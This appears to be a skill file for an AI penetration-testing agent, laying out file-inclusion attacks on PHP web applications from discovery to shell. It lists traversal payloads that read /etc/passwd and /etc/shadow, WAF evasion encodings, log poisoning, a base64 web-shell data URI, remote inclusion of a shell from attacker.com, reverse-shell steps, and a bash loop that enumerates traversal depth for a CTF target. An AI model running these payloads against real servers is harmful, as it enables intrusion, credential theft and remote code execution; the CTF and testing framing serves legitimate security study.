# file-inclusion

# Skill: File Inclusion (LFI / RFI)

> **Supplementary Files**:
> - `payloads.md` — File inclusion attack payload collection: LFI probes, path traversal bypass, PHP wrapper exploitation, log poisoning, RFI payloads, and filter evasion techniques
> - `test-cases.md` — Structured testing use case checklist, covering LFI detection, path traversal bypass, PHP wrapper exploitation, log poisoning RCE, RFI exploitation, and automated fuzzing, with severity levels

## Summary

File Inclusion skill domain covering web attack operations.

**Tools**: dotdotpwn, kadimus, fimap, Burp Suite, php_filter_chain_generator, SecLists, ffuf + SecLists

**Domain**: web-attack

**OWASP**: A01:2021-Broken Access Control

## Description

Local File Inclusion (LFI) and Remote File Inclusion (RFI) attack techniques covering path traversal, PHP wrapper abuse, log poisoning, session file inclusion, and remote payload hosting for code execution. This skill covers the complete file inclusion attack chain from initial parameter discovery through filter bypass to full remote code execution, along with defense measures: input validation, path canonicalization, and disabling dangerous PHP directives.

**Agent capability statement**: Mastery of OWASP-listed file inclusion vulnerabilities across all injection vectors, including advanced LFI-to-RCE escalation through PHP wrappers, log poisoning, /proc/self/environ, and session file inclusion, with automated fuzzing via dotdotpwn and kadimus.

## Use Cases / Use Cases

1. **Web application penetration testing** — Detect file inclusion parameters (`page`, `file`, `path`, `template`, `lang`, `doc`) in target applications and exploit them for file disclosure or code execution
2. **LFI-to-RCE escalation** — Convert local file inclusion into remote code execution through log poisoning, PHP filter chains, PHP input wrappers, data URIs, /proc/self/environ, and session file inclusion
3. **RFI exploitation** — Host malicious payloads on attacker-controlled servers and exploit `allow_url_include` to achieve direct code execution
4. **CTF competition challenges** — Quickly identify file inclusion challenge types, construct encoding bypass payloads, and chain PHP wrappers for flag extraction
5. **Security code audit** — Review file handling logic from a defense perspective, assess path validation bypass risks, and implement proper input sanitization

## Core Tools / Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **dotdotpwn** | Automated path traversal fuzzer with multiple protocol support | `dotdotpwn.pl -m http -h target -u "/page=TRAVERSAL" -o unix` |
| **kadimus** | LFI exploitation tool with automatic RCE via log poisoning and /proc | `kadimus -u "http://target/page=??.php" -o exploit` |
| **fimap** | Local/remote file inclusion scanner and exploitation tool | `fimap -u "http://target/page=test" -x` |
| **Burp Suite** | Intercept and modify HTTP requests, construct inclusion payloads in Repeater | Repeater module debug `?page=....//....//etc/passwd` |
| **php_filter_chain_generator** | Generate PHP filter chain payloads for LFI-to-RCE without log poisoning | `python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'` |
| **SecLists** | Comprehensive wordlists for parameter fuzzing, path traversal, and file inclusion discovery | `ffuf -u "http://target/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` |

## Methodology / Methodology

### Attack Chain / Attack Chain

```
Parameter Discovery → LFI Confirmation → Bypass Filters → LFI-to-RCE Escalation → RFI Testing → Shell Acquisition
```

**1. Identify (Discovery)**
- Identify parameters that may accept file paths: `page=`, `file=`, `path=`, `template=`, `lang=`, `doc=`, `view=`, `include=`, `content=`, `module=`
- Test with common file inclusion probes: `../../../etc/passwd`, `....//....//etc/passwd`
- Use Burp Suite content discovery and ffuf to enumerate hidden parameters

**2. Test LFI (Confirmation)**
- Attempt `../../etc/passwd` on Linux targets, `..\..\..\windows\system32\drivers\etc\hosts` on Windows
- Confirm with secondary reads: `/etc/hostname`, `/etc/shadow`, `/proc/self/cmdline`
- Check for absolute path inclusion: `/etc/passwd` directly without traversal sequences

**3. Bypass (Filter Evasion)**
- Null byte injection: `../../../etc/passwd%00` (PHP < 5.3.4)
- Double encoding: `..%252f..%252f..%252fetc/passwd`
- Unicode encoding: `..%c0%af..%c0%af..%c0%afetc/passwd`
- Path truncation: `./././././[...]/./etc/passwd` (PHP < 5.3 on older systems, 4096 byte limit)
- Filter bypass with `....//` when `../` is stripped once: `....//....//....//etc/passwd`

**4. Escalate LFI-to-RCE (Code Execution)**
- Log poisoning: Inject PHP code into User-Agent or other header fields, include `/var/log/apache2/access.log`
- PHP wrappers: `php://filter/convert.base64-encode/resource=index.php` for source disclosure
- PHP input: `php://input` with POST body containing PHP code
- Data URI: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`
- /proc/self/environ: Include environment variables that contain injected PHP code via User-Agent
- Session file inclusion: Include `/tmp/sess_<session_id>` after injecting PHP into session variables
- PHP filter chains: Use `php_filter_chain_generator` to construct arbitrary code execution payloads

**5. Test RFI (Remote File Inclusion)**
- Host a malicious PHP file on an attacker-controlled HTTP server
- Test if `allow_url_include=On` by including `http://attacker.com/shell.txt`
- RFI payloads execute directly without needing log poisoning or wrappers

**6. Exploit (Shell Acquisition)**
- Get a reverse shell through the inclusion vulnerability
- Use kadimus for automated exploitation: `kadimus -u "URL" --auto`
- Set up netcat listener and trigger reverse shell payload

## Practical Steps / Practical Steps

### Step 1: LFI Detection
Fuzz file inclusion parameters with path traversal payloads using SecLists LFI wordlists. Confirm vulnerability by reading `/etc/passwd` or `/etc/hostname`. Test both relative traversal (`../../../etc/passwd`) and absolute paths (`/etc/passwd`).

### Step 2: Filter Bypass
When basic traversal is blocked, apply encoding techniques: URL encoding (`%2e%2e%2f`), double URL encoding (`%252e%252e%252f`), null byte termination (`%00`), Unicode encoding (`%c0%af`), and path truncation. Use dotdotpwn for automated fuzzing across all bypass variations.

### Step 3: PHP Wrapper Exploitation
Use `php://filter` for source code disclosure, `php://input` for direct code injection via POST body, and `data://` URI for base64-encoded payload execution. Generate PHP filter chain payloads with `php_filter_chain_generator` for targets that block all standard wrappers.

### Step 4: Log Poisoning to RCE
Inject PHP code into HTTP headers (User-Agent, Referer, Cookie) that get logged by Apache or nginx. Include the log file (`/var/log/apache2/access.log`, `/var/log/nginx/access.log`) through LFI to execute the injected code.

### Step 5: RFI Exploitation
Host a malicious PHP file on an attacker-controlled server. Test whether `allow_url_include` is enabled by including the remote URL. RFI provides direct code execution without needing filter bypass or log poisoning.

### Step 6: Shell Acquisition
Deliver a reverse shell payload through any of the LFI-to-RCE vectors or RFI. Use pentestmonkey reverse shell one-liners appropriate to the target language. Establish a stable connection with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

> **See payloads.md for detailed payloads, and test-cases.md for complete test checklist.**

## Defense Evasion Techniques

Evade file inclusion detection by: using double encoding to bypass WAF pattern matching (`%252e%252e%252f` decoded twice to `../`), leveraging Unicode encoding that web servers normalize differently than WAFs (`%c0%af` decoded to `/`), using `....//` when `../` is stripped only once, employing path truncation to bypass suffix appending, and using PHP filter chains that appear as benign base64 conversion operations to WAFs. For RFI, use HTTPS and short-lived payloads to minimize detection window.

## Advanced Techniques

Advanced file inclusion exploitation includes: PHP filter chain exploitation that uses chained `convert.iconv` and `convert.base64` operations to generate arbitrary PHP bytecode in memory without writing to disk, PHP session file inclusion where PHP code is injected into session variables and the session file is included from `/tmp/sess_<id>`, /proc/self/environ exploitation where the User-Agent string is reflected into environment variables and the `/proc/self/environ` pseudo-file is included, PHP temporary file inclusion racing against `php --upload` cleanup, and phar:// wrapper deserialization attacks that trigger object injection through phar metadata.

## Whitelist checkFile Pattern (source.php / hint.php, ?-truncation + traversal depth)

Recognized fingerprint: the page HTML contains `<!--source.php-->` or a link to `source.php`; fetching it shows a `class emmm { public static function checkFile(&$page) ... }` source with a `$whitelist = ["source"=>"source.php", "hint"=>"hint.php"]`. `checkFile` compares ONLY the substring before the FIRST `?` of the `file` parameter against the whitelist, then the raw parameter is passed to `include`. A `php://filter` payload does NOT pass this check — do not repeat it.

Working procedure (ACTF2020-Include family; verified end-to-end):

1. Read the hint page first: `curl -s "$B/?file=hint.php"` — it names the flag file (e.g. `flag not here, and flag in ffffllllaaaagggg`). Read `source.php` to confirm the whitelist shape.
2. Build the bypass as `whitelisted.php?<path>` — everything after `?` is carried into the include as a relative path with directory traversal: `?file=hint.php?../../../../../ffffllllaaaagggg`.
3. The traversal DEPTH is unknown and is the #1 place agents fail: depth 1 or 2 usually misses (file sits at `/` or a few levels up). NEVER retry the same depth — enumerate 1→8 in ONE loop and diff the response tails:

```bash
B=http://TARGET/
for i in 1 2 3 4 5 6 7 8; do
  p=""; for j in $(seq 1 $i); do p="${p}../"; done
  printf "depth %d: " "$i"
  curl -s "${B}?file=hint.php?${p}ffffllllaaaagggg" | tail -c 120
  echo
done
```

4. Calibration: the blocked/else response ends with the page's cat `<img>` template; a hit ends with flag content instead. Compare `tail -c 120` outputs between depths — the depth whose tail differs from the template is the hit; then print it fully.
5. Submit the flag after reading the WHOLE decoded output — flag prefixes vary (`CTF2{`, `csawctf{`, `flag{`, PHP comments), so never grep for a single fixed prefix.
